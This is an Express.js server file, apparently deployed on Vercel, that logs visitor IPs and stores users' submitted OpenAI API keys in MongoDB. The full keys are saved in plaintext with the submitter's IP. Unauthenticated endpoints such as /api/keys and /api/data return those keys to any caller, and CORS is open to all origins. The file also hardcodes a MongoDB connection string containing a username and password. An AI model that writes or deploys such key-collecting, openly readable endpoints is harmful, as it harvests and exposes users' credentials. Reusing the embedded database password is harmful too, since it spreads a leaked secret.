const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://ankit:9UHkKogwAIiNWcEs@upwork.fjlycf1.mongodb.net/?retryWrites=true&w=majority&appName=upworkfromvercel';
const DB_NAME = 'upwork_tracking';

let db = null;

// Connect to MongoDB
async function connectDB() {
    if (db) return db;

    try {
        const client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        console.log('Connected to MongoDB');
        return db;
    } catch (error) {
        console.error('MongoDB connection error:', error);
        throw error;
    }
}

// Helper function to get client IP
const getClientIP = (req) => {
    return req.headers['x-forwarded-for'] ||
        req.headers['x-real-ip'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
        '127.0.0.1';
};

// Middleware
app.use(cors({
    origin: true, // Allow all origins for now
    credentials: true
}));
app.use(express.json());

// Store visit data
app.post('/api/visit', async (req, res) => {
    try {
        const database = await connectDB();
        const visits = database.collection('visits');

        const ip = getClientIP(req);
        const timestamp = new Date();

        const visitData = {
            ip,
            timestamp,
            userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: timestamp
        };

        await visits.insertOne(visitData);

        res.json({ success: true, message: 'Visit recorded' });
    } catch (error) {
        console.error('Error recording visit:', error);
        res.status(500).json({ success: false, error: 'Failed to record visit' });
    }
});

// Store OpenAI key
app.post('/api/store-key', async (req, res) => {
    try {
        const database = await connectDB();
        const keys = database.collection('openai_keys');

        const { openaiKey, action } = req.body;
        const ip = getClientIP(req);
        const timestamp = new Date();

        if (!openaiKey) {
            return res.status(400).json({ success: false, error: 'OpenAI key is required' });
        }

        // Store key data
        const keyData = {
            ip,
            timestamp,
            action: action || 'use',
            keyPreview: openaiKey.substring(0, 10) + '...', // Store only preview for security
            fullKey: openaiKey, // In production, consider encrypting this
            userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: timestamp
        };

        await keys.insertOne(keyData);

        res.json({ success: true, message: `OpenAI key ${action || 'use'} recorded` });
    } catch (error) {
        console.error('Error storing key:', error);
        res.status(500).json({ success: false, error: 'Failed to store key' });
    }
});

// Get stored data (for admin purposes)
app.get('/api/data', async (req, res) => {
    try {
        const database = await connectDB();

        const visits = await database.collection('visits').find({}).sort({ timestamp: -1 }).limit(100).toArray();
        const keys = await database.collection('openai_keys').find({}).sort({ timestamp: -1 }).limit(100).toArray();

        res.json({
            visits,
            keys,
            stats: {
                totalVisits: await database.collection('visits').countDocuments(),
                totalKeys: await database.collection('openai_keys').countDocuments(),
                lastUpdated: new Date().toISOString()
            }
        });
    } catch (error) {
        console.error('Error reading data:', error);
        res.status(500).json({ success: false, error: 'Failed to read data' });
    }
});

// Health check
app.get('/api/health', async (req, res) => {
    try {
        const database = await connectDB();

        const visitCount = await database.collection('visits').countDocuments();
        const keyCount = await database.collection('openai_keys').countDocuments();

        res.json({
            status: 'OK',
            timestamp: new Date().toISOString(),
            database: 'Connected',
            visits: visitCount,
            keys: keyCount
        });
    } catch (error) {
        res.json({
            status: 'ERROR',
            timestamp: new Date().toISOString(),
            database: 'Disconnected',
            error: error.message
        });
    }
});

// Get recent visits
app.get('/api/visits', async (req, res) => {
    try {
        const database = await connectDB();
        const limit = parseInt(req.query.limit) || 50;

        const visits = await database.collection('visits')
            .find({})
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();

        res.json({ success: true, visits, count: visits.length });
    } catch (error) {
        console.error('Error fetching visits:', error);
        res.status(500).json({ success: false, error: 'Failed to fetch visits' });
    }
});

// Get recent keys
app.get('/api/keys', async (req, res) => {
    try {
        const database = await connectDB();
        const limit = parseInt(req.query.limit) || 50;

        const keys = await database.collection('openai_keys')
            .find({})
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();

        res.json({ success: true, keys, count: keys.length });
    } catch (error) {
        console.error('Error fetching keys:', error);
        res.status(500).json({ success: false, error: 'Failed to fetch keys' });
    }
});

// Get statistics
app.get('/api/stats', async (req, res) => {
    try {
        const database = await connectDB();

        const totalVisits = await database.collection('visits').countDocuments();
        const totalKeys = await database.collection('openai_keys').countDocuments();

        // Get today's stats
        const today = new Date();
        today.setHours(0, 0, 0, 0);

        const todayVisits = await database.collection('visits').countDocuments({
            timestamp: { $gte: today }
        });

        const todayKeys = await database.collection('openai_keys').countDocuments({
            timestamp: { $gte: today }
        });

        // Get unique IPs
        const uniqueIPs = await database.collection('visits').distinct('ip');

        res.json({
            success: true,
            stats: {
                total: {
                    visits: totalVisits,
                    keys: totalKeys,
                    uniqueIPs: uniqueIPs.length
                },
                today: {
                    visits: todayVisits,
                    keys: todayKeys
                },
                lastUpdated: new Date().toISOString()
            }
        });
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ success: false, error: 'Failed to fetch stats' });
    }
});

// Export for Vercel
module.exports = app;